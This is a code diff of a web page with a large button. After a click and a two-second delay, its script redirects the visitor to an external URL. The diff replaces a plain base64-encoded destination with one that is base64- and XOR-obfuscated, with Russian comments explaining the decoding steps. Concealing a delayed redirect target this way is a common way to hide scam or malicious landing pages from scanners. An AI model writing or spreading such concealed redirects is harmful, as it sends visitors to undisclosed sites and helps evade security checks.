@@ -21,7 +21,7 @@
       color: black;
       border: none;
       border-radius: 9999px;
-      padding: 0.5rem 9rem;
+      padding: 1.5rem 3rem;
       font-size: 2rem;
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
@@ -69,15 +69,19 @@
       if (!interacted) return;
 
       setTimeout(() => {
-        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 of your URL
+        const encoded = "FDcVEhQbSRpVDBUbU0cME1BdDglbFlcHVRgBFQ=="; // base64 XOR шифрованного URL
         const xorKey = 3;
+
+        // Декодируем base64
         const base64Decoded = atob(encoded);
+
+        // Расшифровываем XOR
         const finalURL = base64Decoded
           .split('')
           .map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey))
           .join('');
 
-        eval(`window.location.href = "${finalURL}"`);
+        window.location.href = finalURL;
       }, 2000);
     }
   </script>
